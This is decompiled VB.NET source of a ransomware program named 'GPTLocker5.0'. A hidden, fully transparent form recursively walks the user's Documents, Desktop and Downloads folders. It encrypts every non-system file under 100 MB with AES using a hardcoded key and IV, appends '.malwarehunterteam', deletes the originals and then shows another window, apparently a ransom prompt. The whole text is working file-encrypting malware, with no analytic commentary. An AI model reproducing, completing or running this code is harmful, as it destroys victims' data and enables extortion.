Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Drawing
Imports System.IO
Imports System.Linq
Imports System.Security.Cryptography
Imports System.Windows.Forms
Imports Microsoft.VisualBasic.CompilerServices

Namespace GPTLocker5._0
	' Token: 0x0200000C RID: 12
	<DesignerGenerated()>
	Public Partial Class Form1
		Inherits Form

		' Token: 0x0600002C RID: 44 RVA: 0x00002547 File Offset: 0x00000747
		Public Sub New()
			AddHandler MyBase.Load, AddressOf Me.Form1_Load
			Me.method_3()
		End Sub

		' Token: 0x1700000D RID: 13
		' (get) Token: 0x0600002D RID: 45 RVA: 0x00002568 File Offset: 0x00000768
		Protected Overrides ReadOnly Property ShowWithoutActivation As Boolean
			Get
				Return True
			End Get
		End Property

		' Token: 0x0600002E RID: 46 RVA: 0x000029F0 File Offset: 0x00000BF0
		Private Sub Form1_Load(sender As Object, e As EventArgs)
			Try
				Me.method_0(Environment.GetFolderPath(Environment.SpecialFolder.Personal))
			Catch ex As Exception
			End Try
			Try
				Me.method_0(Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
			Catch ex2 As Exception
			End Try
			Try
				Me.method_0(Environment.GetEnvironmentVariable("UserProfile") + "\Downloads")
			Catch ex3 As Exception
			End Try
			Class2.Class3_0.Middleman.Show()
		End Sub

		' Token: 0x0600002F RID: 47 RVA: 0x00002A9C File Offset: 0x00000C9C
		Private Sub method_0(string_0 As String)
			For Each string_ As String In Directory.GetFiles(string_0)
				If Not Me.method_1(string_) Then
					Me.method_2(string_)
				End If
			Next
			For Each string_2 As String In Directory.GetDirectories(string_0)
				Me.method_0(string_2)
			Next
		End Sub

		' Token: 0x06000030 RID: 48 RVA: 0x00002AFC File Offset: 0x00000CFC
		Private Function method_1(string_0 As String) As Boolean
			Dim source As IEnumerable(Of String) = New String() { Form1.newExtension, ".exe", ".dll", ".scr", ".com", ".pif", ".ini", ".log", ".sys", ".drv", ".xml", ".dat", ".reg" }
			Dim extension As String = Path.GetExtension(string_0)
			Return source.Contains(extension)
		End Function

		' Token: 0x06000031 RID: 49 RVA: 0x00002B98 File Offset: 0x00000D98
		Private Sub method_2(string_0 As String)
			Try
				If New FileInfo(string_0).Length <= 104857600L Then
					Dim path As String = string_0 + Form1.newExtension
					Using aes As Aes = Aes.Create()
						aes.Key = Form1.byte_0
						aes.IV = Form1.byte_1
						Using fileStream As FileStream = New FileStream(string_0, FileMode.Open)
							Using fileStream2 As FileStream = New FileStream(path, FileMode.Create)
								Using cryptoTransform As ICryptoTransform = aes.CreateEncryptor(aes.Key, aes.IV)
									Using cryptoStream As CryptoStream = New CryptoStream(fileStream2, cryptoTransform, CryptoStreamMode.Write)
										fileStream.CopyTo(cryptoStream)
									End Using
								End Using
							End Using
						End Using
					End Using
					File.Delete(string_0)
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000033 RID: 51 RVA: 0x00002D00 File Offset: 0x00000F00
		Private Sub method_3()
			MyBase.SuspendLayout()
			MyBase.AutoScaleDimensions = New SizeF(6F, 13F)
			MyBase.AutoScaleMode = AutoScaleMode.Font
			MyBase.ClientSize = New Size(127, 109)
			MyBase.ControlBox = False
			MyBase.FormBorderStyle = FormBorderStyle.None
			MyBase.MaximizeBox = False
			MyBase.MinimizeBox = False
			MyBase.Name = "Form1"
			MyBase.Opacity = 0.0
			MyBase.ShowIcon = False
			MyBase.ShowInTaskbar = False
			MyBase.StartPosition = FormStartPosition.CenterScreen
			Me.Text = " "
			MyBase.ResumeLayout(False)
		End Sub

		' Token: 0x04000010 RID: 16
		Public Shared newExtension As String = ".malwarehunterteam"

		' Token: 0x04000011 RID: 17
		Private Shared byte_0 As Byte() = New Byte() { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }

		' Token: 0x04000012 RID: 18
		Private Shared byte_1 As Byte() = New Byte() { 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48 }
	End Class
End Namespace
